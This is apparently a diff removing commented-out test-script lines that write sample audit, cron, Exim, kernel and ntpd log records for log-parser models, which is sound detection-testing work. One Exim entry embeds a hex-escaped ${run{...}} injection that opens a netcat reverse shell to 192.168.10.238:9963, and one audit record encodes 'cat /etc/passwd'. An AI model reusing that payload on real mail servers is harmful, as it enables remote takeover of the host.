-#            echo "audispd: type=CHGRP_ID msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=CHUSER_ID msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=CONFIG_CHANGE msg=audit(1368831799.081:466947): auid=4294967295 ses=4294967295 op=\"remove rule\" path=\"/path/to/my/bin0\" key=(null) list=4 res=1" >> $LOG_FILE
-#            echo "type=CONFIG_CHANGE msg=audit(1479097266.018:224): auid=500 ses=2 op=\"updated_rules\" path=\"/etc/passwd\" key=\"passwd_changes\" list=4 res=1" >> $LOG_FILE
-#            echo "audispd: type=CRED_ACQ msg=audit(1450894634.199:1276): pid=1956 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=192.168.2.100 addr=192.168.2.100 terminal=ssh res=success'" >> $LOG_FILE
-#            echo "audispd: type=CRED_DISP msg=audit(1450894635.111:1281): pid=1956 uid=0 auid=0 ses=213 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=192.168.2.100 addr=192.168.2.100 terminal=ssh res=success'" >> $LOG_FILE
-#            echo "audispd: type=CRED_REFR msg=audit(1450894634.211:1279): pid=1958 uid=0 auid=0 ses=213 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=192.168.2.100 addr=192.168.2.100 terminal=ssh res=success'" >> $LOG_FILE
-#            echo "audispd: type=CRYPTO_FAILURE_USER msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=CRYPTO_KEY_USER msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=CRYPTO_LOGIN msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=CRYPTO_LOGOUT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=CRYPTO_PARAM_CHANGE_USER msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=CRYPTO_REPLAY_USER msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=CRYPTO_SESSION msg=audit(1150750972.008:3281471): user pid=1111 uid=0 auid=1111 msg='op=start direction=from-server cipher=aes128-ctr ksize=128 rport=40791 laddr=192.168.22.22 lport=22 id=4294967295 exe=\"/usr/sbin/sshd\" (hostname=?, addr=205.22.22.22, terminal=? res=success)'" >> $LOG_FILE
-#            echo "audispd: type=CRYPTO_TEST_USER msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo 'audispd: type=CWD msg=audit(1450767416.248:3295858):  cwd="/"' >> $LOG_FILE
-#            echo "audispd: type=DAC_CHECK msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=DAEMON_ABORT msg=audit(1339336882.189:9206): auditd error halt, auid=4294967295 pid=3095 res=failed" >> $LOG_FILE
-#            echo "audispd: type=DAEMON_ACCEPT msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=DAEMON_CLOSE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=DAEMON_CONFIG msg=audit(1264985324.554:4915): auditd error getting hup info - no change, sending auid=? pid=? subj=? res=failed" >> $LOG_FILE
-#            echo "audispd: type=DAEMON_END msg=audit(1450876093.165:8729): auditd normal halt, sending auid=0 pid=1 subj= res=success" >> $LOG_FILE
-#            echo "audispd: type=DAEMON_RESUME msg=audit(1300385209.456:8846): auditd resuming logging, sending auid=? pid=? subj=? res=success" >> $LOG_FILE
-#            echo "audispd: type=DAEMON_ROTATE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=DAEMON_START msg=audit(1450875964.131:8728): auditd start, ver=2.4 format=raw kernel=3.16.0-4-amd64 auid=4294967295 pid=1437 res=failed" >> $LOG_FILE
-#            echo "audispd: type=DEL_GROUP msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=DEL_USER msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=EOE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo 'audispd: type=EXECVE msg=audit(1582934957.620:917519): argc=10 a0="find" a1="/usr/lib/php" a2="-mindepth" a3="1" a4="-maxdepth" a5="1" a6="-regex" a7=".*[0-9]\.[0-9]" a8="-printf" a9="%f\n"' >> $LOG_FILE
-#            echo "audispd: type=FD_PAIR msg=audit(1431919799.945:49458): fd0=5 fd1=6" >> $LOG_FILE
-#            echo "audispd: type=FS_RELABEL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=GRP_AUTH msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=INTEGRITY_DATA msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=INTEGRITY_HASH msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=INTEGRITY_METADATA msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=INTEGRITY_PCR msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=INTEGRITY_RULE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=INTEGRITY_STATUS msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=IPC msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=IPC_SET_PERM msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=KERNEL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=KERNEL_OTHER msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=LABEL_LEVEL_CHANGE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=LABEL_OVERRIDE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=LOGIN msg=audit(1450767601.778:3296208): login pid=15763 uid=0 old auid=4294967295 new auid=0 old ses=4294967295 new ses=2260" >> $LOG_FILE
-#            echo "audispd: type=MAC_CIPSOV4_ADD msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=MAC_CIPSOV4_DEL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=MAC_CONFIG_CHANGE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=MAC_IPSEC_EVENT msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=MAC_MAP_ADD msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=MAC_MAP_DEL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=MAC_POLICY_LOAD msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=MAC_STATUS msg=audit(1336836093.835:406): enforcing=1 old_enforcing=0 auid=0 ses=2" >> $LOG_FILE
-#            echo "audispd: type=MAC_UNLBL_ALLOW msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=MAC_UNLBL_STCADD msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=MAC_UNLBL_STCDEL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=MMAP msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=MQ_GETSETATTR msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=MQ_NOTIFY msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=MQ_OPEN msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=MQ_SENDRECV msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=NETFILTER_CFG msg=audit(1479622038.866:2): table=filter family=2 entries=0" >> $LOG_FILE
-#            echo "audispd: type=NETFILTER_PKT msg=audit(1487874761.386:228): mark=0xae8a2732 saddr=127.0.0.1 daddr=127.0.0.1 proto=17" >> $LOG_FILE
-#            echo "audispd: type=NETFILTER_PKT msg=audit(1487874761.381:227): mark=0x223894b7 saddr=::1 daddr=::1 proto=58" >> $LOG_FILE
-#            echo "audispd: type=OBJ_PID msg=audit(1279134100.434:193): opid=1968 oauid=-1 ouid=0 oses=-1 obj=<NULL> ocomm=\"sleep\"" >> $LOG_FILE
-#            echo 'audispd: type=PATH msg=audit(1582934957.616:917512): item=0 name="/usr/bin/sort" inode=2883 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL' >> $LOG_FILE
-#            echo 'audispd: type=PROCTITLE msg=audit(1582934957.616:917512): proctitle=736F7274002D726E' >> $LOG_FILE
-#            echo "audispd: type=RESP_ACCT_LOCK msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=RESP_ACCT_LOCK_TIMED msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=RESP_ACCT_REMOTE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=RESP_ACCT_UNLOCK_TIMED msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=RESP_ALERT msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=RESP_ANOMALY msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=RESP_EXEC msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=RESP_HALT msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=RESP_KILL_PROC msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=RESP_SEBOOL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=RESP_SINGLE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=RESP_TERM_ACCESS msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=RESP_TERM_LOCK msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=ROLE_ASSIGN msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=ROLE_MODIFY msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=ROLE_REMOVE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=SELINUX_ERR msg=audit(1311948547.151:138): op=security_compute_av reason=bounds scontext=system_u:system_r:anon_webapp_t:s0-s0:c0,c100,c200 tcontext=system_u:object_r:security_t:s0 tclass=dir perms=ioctl,read,lock" >> $LOG_FILE
-#            echo "audispd: type=SERVICE_START msg=audit(1450876900.115:30): pid=1 uid=0 auid=4294967295 ses=4294967295 msg=' comm=\"Serv-U\" exe=\"/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'" >> $LOG_FILE
-#            echo "audispd: type=SERVICE_STOP msg=audit(1450876900.115:31): pid=1 uid=0 auid=4294967295 ses=4294967295 msg=' comm=\"Serv-U\" exe=\"/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'" >> $LOG_FILE
-#            echo "audispd: type=SOCKADDR msg=audit(1582935421.377:947594): saddr=01002F6465762F6C6F6700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" >> $LOG_FILE
-#            echo "audispd: type=SOCKETCALL msg=audit(1134642541.683:201): nargs=3 a0=10 a1=3 a2=9" >> $LOG_FILE
-#            echo 'audispd: type=SYSCALL msg=audit(1582934957.616:917513): arch=c000003e syscall=2 success=yes exit=3 a0=7f5b904e4988 a1=80000 a2=1 a3=7f5b906ec518 items=1 ppid=25680 pid=25684 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="sort" exe="/usr/bin/sort" key=(null)' >> $LOG_FILE
-#            echo "audispd: type=SYSTEM_BOOT msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=SYSTEM_RUNLEVEL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=SYSTEM_SHUTDOWN msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=TRUSTED_APP msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=TTY msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=USER_ACCT msg=audit(1234877011.795:7732): user pid=26127 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=\"root\" exe=\"/usr/sbin/sshd\" (hostname=jupiter.example.com, addr=192.168.2.100, terminal=ssh res=success)'" >> $LOG_FILE
-#            echo "audispd: type=USER_AUTH msg=audit(1451403184.143:1834): pid=3380 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"toor\" exe=\"/usr/sbin/sshd\" hostname=192.168.2.100 addr=192.168.2.100 terminal=ssh res=failed'" >> $LOG_FILE
-#            echo "audispd: type=USER_AUTH msg=audit(1451403193.995:1835): pid=3380 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"toor\" exe=\"/usr/sbin/sshd\" hostname=192.168.2.100 addr=192.168.2.100 terminal=ssh res=success'" >> $LOG_FILE
-#            echo "audispd: type=USER_AVC msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=USER_CHAUTHTOK msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=USER_CMD msg=audit(1450785575.705:3316357): user pid=21619 uid=0 auid=526 msg='cwd=\"/home/hi\" cmd=\"/bin/bash\" (terminal=pts/0 res=success)'" >> $LOG_FILE
-#            echo "audispd: type=USER_END msg=audit(1450767601.813:3296218): user pid=15764 uid=0 auid=0 msg='PAM: session close acct=\"root\" : exe=\"/usr/sbin/crond\" (hostname=?, addr=?, terminal=cron res=success)'" >> $LOG_FILE
-#            echo "audispd: type=USER_ERR msg=audit(1450770602.157:3300444): user pid=16643 uid=0 auid=4294967295 msg='PAM: bad_ident acct="?" : exe=\"/usr/sbin/sshd\" (hostname=111.111.211.38, addr=111.111.211.38, terminal=ssh res=failed)'" >> $LOG_FILE
-#            echo "audispd: type=USER_LABELED_EXPORT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=USER_LOGIN msg=audit(1450770603.209:3300446): user pid=16649 uid=0 auid=4294967295 msg='acct=\"root\": exe=\"/usr/sbin/sshd\" (hostname=?, addr=11.111.53.58, terminal=sshd res=failed)'" >> $LOG_FILE
-#            echo "audispd: type=USER_LOGOUT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=USER_MAC_POLICY_LOAD msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=USER_MGMT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=USER_ROLE_CHANGE msg=audit(1280266360.845:51): user pid=1978 uid=0 auid=500 subj=system_u:system_r:local_login_t:s0-s0:c0.c1023 msg='pam: default-context=user_u:system_r:unconfined_t:s0 selected-context=user_u:system_r:unconfined_t:s0: exe=\"/bin/login\" (hostname=?, addr=?, terminal=tty1 res=success)'" >> $LOG_FILE
-#            echo "audispd: type=USER_SELINUX_ERR msg=audit(1311948547.151:138): Text" >> $LOG_FILE
-#            echo "audispd: type=USER_START msg=audit(1450771201.437:3301540): user pid=16878 uid=0 auid=0 msg='PAM: session open acct=\"root\" : exe=\"/usr/sbin/crond\" (hostname=?, addr=?, terminal=cron res=success)'" >> $LOG_FILE
-#            echo "audispd: type=USER_TTY msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=USER_UNLABELED_EXPORT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=USYS_CONFIG msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=VIRT_CONTROL msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=VIRT_MACHINE_ID msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=VIRT_RESOURCE msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audisp-remote: queue is full - dropping event" >> $LOG_FILE
-#            echo "audispd: queue is full - dropping event" >> $LOG_FILE
-#            echo "audispd: type=UNKNOWN[1327] msg=audit(1522927552.749:917): proctitle=636174002F6574632F706173737764" >> $LOG_FILE
-#            ;;
-#        CronParsingModel)
-#            echo "CRON[25537]: (root) CMD ping 8.8.8.8" > $LOG_FILE
-#            echo "CRON[25537]: pam_unix(cron:session): session opened for user root by (uid=0)" >> $LOG_FILE
-#            echo "cron[25537]: (*system*mailman) RELOAD (/var/spool/cron/mailman)" >> $LOG_FILE
-#            echo "CRON[12461]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)" >> $LOG_FILE
-#            echo "CRON[12460]: pam_unix(cron:session): session opened for user root by (uid=0)" >> $LOG_FILE
-#            echo "CRON[13229]: (root) CMD ([ -x /etc/init.d/anacron ] && if [ ! -d /run/systemd/system ]; then /usr/sbin/invoke-rc.d anacron start >/dev/null; fi)" >> $LOG_FILE
-#            echo "CRON[14368]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)" >> $LOG_FILE
-#            ;;
-#        EximGenericParsingModel)
-#            echo "2020-02-29 00:04:25 Start queue run: pid=31912" > $LOG_FILE
-#            echo "2020-02-29 00:34:25 End queue run: pid=32425" >> $LOG_FILE
-#            echo "2020-03-04 19:17:34 no host name found for IP address 192.168.10.238" >> $LOG_FILE
-#            echo "2020-03-04 19:21:48 VRFY failed for boyce@cup.com H=(x) [192.168.10.238]" >> $LOG_FILE
-#            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi <= trula@mail.cup.com U=www-data P=local S=8714 id=20200304192508.Horde.g3OQpszuommgdrQpHrx6wIc@mail.cup.com" >> $LOG_FILE
-#            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi => irwin <irwin@mail.cup.com> R=local_user T=mail_spool" >> $LOG_FILE
-#            echo '2020-03-04 19:36:19 1j9ZoZ-0002Jk-9W ** ${run{\x2fbin\x2fsh\t-c\t\x22nc\t-e\t\x2fbin\x2fsh\t192.168.10.238\t9963\x22}}@localhost: Too many "Received" headers - suspected mail loop' >> $LOG_FILE
-#            echo "2020-03-04 19:36:57 1j9ZpB-0002KN-QF Completed" >> $LOG_FILE
-#            echo "2020-03-04 20:04:25 1j9ZoZ-0002Jk-9W Message is frozen" >> $LOG_FILE
-#            echo "2020-03-04 19:38:19 1j9ZoZ-0002Jk-9W Frozen (delivery error message)" >> $LOG_FILE
-#            # following examples are covering exim failure message types. The examples are taken from
-#            # https://forums.cpanel.net/resources/reading-and-understanding-the-exim-main_log.383/
-#            echo "2014-09-29 21:27:08 1XYdJu-002e6P-9F SMTP error from remote mail server after MAIL FROM:<someone@someaddress.com> SIZE=6601: host mta5.am0.yahoodns.net [66.196.118.240]: 421 4.7.0 [GL01] Message from (184.171.253.133) temporarily deferred - 4.16.50. Please refer to http://postmaster.yahoo.com/errors/postmaster-21.html" >> $LOG_FILE
-#            echo "2020-04-28 22:08:03 1m1x23-2011cZ-MN H=mta7.am0.yahoodns.net [67.195.228.106]: SMTP error from remote mail server after pipelined MAIL FROM:<SENDER@senderdomain.com> SIZE=1758: 421 4.7.0 [TSS04] Messages from 184.171.253.133 temporarily deferred due to unexpected volume or user complaints - 4.16.55.1; see https://postmaster.verizonmedia.com/error-codes" >> $LOG_FILE
-#            echo "2014-09-12 08:01:12 1XSLn4-003Fa1-OX SMTP error from remote mail server after end of data: host gmail-smtp-in.l.google.com [173.194.66.27]: 421-4.7.0 [77.69.28.195 15] Our system has detected an unusual rate of\n421-4.7.0 unsolicited mail originating from your IP address. To protect our\n421-4.7.0 users from spam, mail sent from your IP address has been temporarily\n421-4.7.0 rate limited. Please visit\n421-4.7.0 http://www.google.com/mail/help/bulk_mail.html to review our Bulk\n421 4.7.0 Email Senders Guidelines. q4si1448293wij.85 - gsmtp" >> $LOG_FILE
-#            echo "2014-09-18 13:44:19 1XUb4M-000v5R-6R SMTP error from remote mail server after MAIL FROM:<someone@someaddress.com> SIZE=1811: host mta7.am0.yahoodns.net [66.66.66.66]: 421 4.7.1 [TS03] All messages from 5.196.113.212 will be permanently deferred; Retrying will NOT succeed. See http://postmaster.yahoo.com/421-ts03.html" >> $LOG_FILE
-#            echo "TO:<someone@someaddress>: host mx.someaddress.com [20.20.20.20]: 450 4.7.1 Client host rejected: cannot find your hostname, [20.20.20.20] 2014-09-21 16:06:05 1XUKFa-0003bb-EM ** someone@someaddress>: retry timeout exceeded" >> $LOG_FILE
-#            echo "2014-10-10 10:25:01 1XcKLM-003IGU-Fr SMTP error from remote mail server after RCPT TO:<ma@bol.com>: host pro-mail-mx-002.bol.com [20.20.20.20]: 450 4.7.1 Service unavailable" >> $LOG_FILE
-#            echo "2014-09-24 12:59:49 1XWqqy-00028x-FK == test@badluckbryan.com R=lookuphost T=remote_smtp defer (-44): SMTP error from remote mail server after RCPT TO:<test@gylsystems.com>: host gylsystems.com [69.69.69.69]: 451 Temporary local problem - please try later" >> $LOG_FILE
-#            echo "2014-11-24 11:25:33 H=localhost (mail.fictional.example) [::1]:49956 sender verify defer for <aaron@domain.com>: require_files: error for /home/aaron/etc/domain.com: Permission denied" >> $LOG_FILE
-#            echo "2014-11-24 11:25:33 H=localhost (srv-hs1.netsons.net) [::1]:49956 F=<aaron@domain.com> A=dovecot_login:aaron@domain.com temporarily rejected RCPT <test@pleasecheck.net>: Could not complete sender verify" >> $LOG_FILE
-#            echo "2014-09-13 11:37:53 1XSdCz-00049U-5A ==aaron@domain.com R=lookuphost T=remote_smtp defer (-44): SMTP error from remote mail server after RCPT TO:<aaron@domain.com>: host mail.fictional.example [10.5.40.204]: 452 <aron@domain.com> Domain size limit exceeded" >> $LOG_FILE
-#            echo "2014-08-31 08:43:16 1XO5PX-0006SC-Qa ** aaron@domain.com R=dkim_lookuphost T=dkim_remote_smtp: SMTP error from remote mail server after RCPT TO:<aaron@domain.com>: host mail.domain.com [10.5.40.204]: 550-Verification for <garfield@domain.com>\n550-The mail server could not deliver mail to garfield@domain.com. The account or domain may not exist, they may be blacklisted, or missing the proper dns entries.\n550 Sender verify failed" >> $LOG_FILE
-#            echo "SMTP error from remote mail server after RCPT TO:: host mail.fictional.example[10.5.40.204]: 550-Sender has no A, AAAA, or MX DNS records. mail.fictional.example\n550 l mail.fictional.example\nVerify the zone file in /etc/named for the correct information. If it appear correct, you can run named-checkzone domain.com domain.com.db to verify if named is able to load the zone." >> $LOG_FILE
-#            echo "Diagnostic-Code: X-Postfix; host mail1.domain.com [10.5.40.204] said: 550 5.7.1 Message rejected due to content restrictions (in reply to end of DATA command)\nWhen you see an error such as 550 5.7.1" >> $LOG_FILE
-#            echo "Final-Recipient: rfc822;aaron@domain.com\nAction: failed\nStatus: 5.5.0\nDiagnostic-Code: smtp;550-Please turn on SMTP Authentication in your mail client.\n550-mail.fictional.example [10.5.40.204]:58133 is not permitted to relay 550 through this server without authentication." >> $LOG_FILE
-#            echo "DHE-RSA-AES256-SHA:256: SMTP error from remote mail server after MAIL FROM:<aaron@domain.com> SIZE=1834: host mail.fictional.example [10.5.40.204..212]: 550 \"REJECTED - Bad HELO - Host impersonating [mail.fictional2.example]\"" >> $LOG_FILE
-#            echo "2014-08-31 08:43:16 1XO5PY-0006SO-GS <= <> R=1XO5PX-0006SC-Qa U=mailnull P=local S=1951 T=\"Mail delivery failed: returning message to sender\" for aaron@domain.com" >> $LOG_FILE
-#            echo "SMTP error from remote mail server after MAIL FROM:<aaron@domain.com>: host mail.fictional.example [10.5.40.204]: 553 sorry, your domain does not exists." >> $LOG_FILE
-#            echo "2014-11-26 10:26:32 1XtYro-004Ecv-65 ** aaron@domain.com R=dkim_lookuphost T=dkim_remote_smtp: SMTP error from remote mail server after MAIL FROM:<aaron@domain.com> SIZE=1604: host mail.fictional.example [10.5.40.204]: 553 <aaron@domain.com> unable to verify address\nVerify that SMPT authentication has been enabled." >> $LOG_FILE
-#            echo "[15:03:30 hosts5 root /var/log]cPs# grep 1XeRdP-0006JC-FO exim_mainlog 2014-10-15 12:41:11 1XeRdP-0006JC-FO <= <> R=1XeRdF-0006HI-EY U=mailnull P=local S=5445 T=\"Mail delivery failed: returning message to sender\" for aaron@domain.com 2014-10-15 12:41:11 cwd=/var/spool/exim 3 args: /usr/sbin/exim -Mc 1XeRdP-0006JC-FO 2014-10-15 12:42:12 1XeRdP-0006JC-FO ** aaron@domain.com R=dkim_lookuphost T=dkim_remote_smtp: SMTP error from remote mail server after end of data: host mail.fictional.example [10.5.40.204]: 554 rejected due to spam content" >> $LOG_FILE
-#            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS H=mail.fictional.example [10.5.40.204]:4779 Warning: \"SpamAssassin as marka22 detected message as spam (11.0)\"" >> $LOG_FILE
-#            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS <=10.5.40.204 H=mail.fictional.example[10.5.40.204]:4779 P=esmtp S=491878 id=dos45yx4zbmri7f@domain.com T="Payment confirmation: 7037487121" for aaron@domain.net [" >> $LOG_FILE
-#            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS => aaron  <aaron@domain.net [> R=virtual_user_spam T=virtual_userdelivery_spam" >> $LOG_FILE
-#            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS Completed 2014-10-01 15:30:35 1XZKvG-0002HW-ML H=(12-12-12-12.domain.net [10.5.40.204]:65376 Warning: \"SpamAssassin as marka22 detected message as spam (7.2)\"" >> $LOG_FILE
-#            echo "2014-10-01 15:30:35 1XZKvG-0002HW-ML <= item@something.net H=(12-12-12-12.domain.net [10.5.40.204]:65376 P=esmtp S=519381 id=dos45yx4zbmri7f@domain.com T=\"Payment confirmation: 7037487121\" for mark@domain.com 2014-10-01 15:30:35 1XZKvG-0002HW-ML => mark <mark@domain.net [> R=virtual_user_spam T=virtual_userdelivery_spam" >> $LOG_FILE
-#            echo "2014-10-01 15:30:35 1XZKvG-0002HW-ML Completed" >> $LOG_FILE
-#            echo "2014-09-10 13:06:55 1XRlM6-003yMv-KG H=mail.fictional.example[10.5.40.204]:46793 Warning: Message has been scanned: no virus or other harmful content was found" >> $LOG_FILE
-#            echo "2014-09-10 13:06:56 1XRlM6-003yMv-KG H=mail.fictional.example[10.5.40.204]:46793 Warning: \"SpamAssassin as cpaneleximscanner detected OUTGOING smtp message as NOT spam (-0.1)\"" >> $LOG_FILE
-#            echo "2014-09-10 13:06:56 1XRlM6-003yMv-KG <= bob@bob.com H=mail.fictional.example [10.5.40.204]:46793 P=esmtpsa X=TLSv1:AES128-SHA:128 A=dovecot_login:aaron@domain.com S=18635 T=\"14\\\" plates\" for live@somedomain.com" >> $LOG_FILE
-#            echo "2014-09-10 13:06:56 1XRlM6-003yMv-KG SMTP connection outbound 1410368816 1XRlM6-003yMv-KG domain.com live@somedomain.com" >> $LOG_FILE
-#            echo "2014-09-10 13:07:22 1XRlM6-003yMv-KG => live@somedomain.com R=dkim_lookuphost T=dkim_remote_smtp H=mail.fictional.example [10.5.40.204] X=TLSv1:DHE-RSA-AES256-SHA:256 C=\"250 OK id=1XRlMC-0006w5-F4\" 2014-09-10 13:07:22 1XRlM6-003yMv-KG Completed" >> $LOG_FILE
-#            echo "2014-11-06 09:14:13 1XmNp0-0005Qp-MR H=mail-qg0-f68.google.com [10.5.40.204]:42603 Warning: \"SpamAssassin as sfgthib detected message as spam (998.0)\" 2014-11-06 09:14:13 1XmNp0-0005Qp-MR H=mail-qg0-f68.google.com [10.5.40.204]:42603 Warning: Message has been scanned: no virus or other harmful content was found" >> $LOG_FILE
-#            echo "2014-11-06 09:14:13 1XmNp0-0005Qp-MR <= cpaneltest@gmail.com H=mail.fictional.example [10.5.40.204]:42603 P=esmtps X=TLSv1:RC4-SHA:128 S=3411 id=CAPtYmmQYRDb38yTmnA_ULZVjnKVOdtu6yw-HapGmjBCAk6rYYw@mail.gmail.com T=\"test\" for aaron@domain.com" >> $LOG_FILE
-#            ;;
-#        KernelMsgParsingModel)
-#            echo "kernel: martian source 192.168.12.197 from 192.168.12.198, on dev bondib0" > $LOG_FILE
-#            echo "kernel: martian source 192.168.1.255 from 192.168.1.251, on dev eth3" >> $LOG_FILE
-#            echo "kernel: ll header: ff:ff:ff:ff:ff:ff:00:18:f8:0e:81:93:08:00" >> $LOG_FILE
-#            echo "kernel: martian source 192.168.12.197 from 192.168.12.198, on dev bondib0" >> $LOG_FILE
-#            echo "kernel: ll header: 00000000: ff ff ff ff ff ff 00 50 56 ad 59 09 08 00 .......PV.Y..." >> $LOG_FILE
-#            echo "kernel: ll header: 00000000: ff ff ff ff ff ff a6 2c 90 bb 31 e9 08 06        .......,..1..." >> $LOG_FILE
-#            ;;
-#        NtpParsingModel)
-#            echo "ntpd[8457]: Listen and drop on 0 v6wildcard [::]:123" > $LOG_FILE
-#            echo "ntpd[8457]: Listen and drop on 1 v4wildcard 0.0.0.0:123" >> $LOG_FILE
-#            echo "ntpd[8457]: Listen normally on 2 lo 127.0.0.1:123" >> $LOG_FILE
-#            echo "ntpd[8457]: Listen normally on 3 eth0 1.2.2.19:123" >> $LOG_FILE
